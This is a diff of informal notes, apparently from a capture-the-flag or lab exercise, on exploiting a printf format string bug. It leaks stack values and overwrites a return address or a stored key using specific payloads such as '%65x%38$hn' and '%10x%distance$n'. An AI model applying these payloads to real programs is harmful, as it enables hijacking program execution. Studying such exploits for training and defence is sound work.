@@ -3,8 +3,19 @@ it is stored at offset 76 from our stack leak
 we convinetely get 4 different calls to printf
 we can use each call to overwrite one of the 4 bytes that make up the return address, to redirect code execution
 all we have to do is pad(remember little endian)
+we will redirect to 0x0804869f
 we will do it in 2 writes, since %n was built for ints, and the smallest int specifier is %hn.
 %[LSB in decimal]x%19
+%65x%38$hn
+%1x%39$hn
 %[LSB+1 in decimal]x
 
-continue tomorrow! :)
+
+
+altarnative method: find EBP and overwrite key
+
+EBP = %18$x
+distance = 72/4  + (0xffffd6d8 - EBP)/4
+
+First, leak EBP : %18$x
+Then, write to offset (the value 0x0a=10=ENTER): %10x%distance$n
